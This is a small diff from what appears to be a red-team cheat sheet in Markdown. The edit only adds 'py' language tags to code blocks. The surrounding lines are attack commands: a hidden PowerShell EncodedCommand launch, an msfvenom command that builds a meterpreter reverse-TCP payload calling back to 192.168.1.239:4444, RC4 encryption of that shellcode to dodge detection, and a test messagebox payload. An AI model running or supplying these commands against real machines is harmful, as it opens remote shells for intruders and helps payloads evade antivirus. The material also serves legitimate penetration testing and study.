@@ -303,7 +303,7 @@ powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
 
 ##### Hex Encode 
 
-```
+```py
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
 //cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
 xxd -i encmeter.bin
@@ -311,7 +311,7 @@ xxd -i encmeter.bin
 
 ##### Default MSF bin
 
-```
+```py
 msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
 ```
 
